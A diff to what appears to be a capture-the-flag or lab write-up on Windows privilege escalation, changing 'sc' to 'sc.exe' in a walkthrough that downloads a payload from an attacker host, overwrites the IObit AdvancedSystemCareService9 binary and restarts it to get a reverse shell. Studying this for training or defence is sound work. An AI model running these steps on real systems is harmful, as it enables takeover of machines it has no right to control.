@@ -46,18 +46,18 @@ Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwr
 Useful PowerShell commands:
 
 * `Get-Service` - list all services, or drill down on a particular service.
-* `sc stop $SERVICE`/`sc start $SERVICE` - stop/start $SERVICE.
+* `sc.exe stop $SERVICE`/`sc.exe start $SERVICE` - stop/start $SERVICE.
 
 Putting this all together, we can replicate yesterday's compromise by:
 
 ```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
-sc stop AdvancedSystemCareService9
+sc.exe stop AdvancedSystemCareService9
 copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 	ASCService.exe.bak
 copy /Y ASCService.exe
 	"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
-sc start AdvancedSystemCareService9
+sc.exe start AdvancedSystemCareService9
 ```
 
 Where ASCService.exe is the same compromise as last time, and we again catch the reverse shell using:
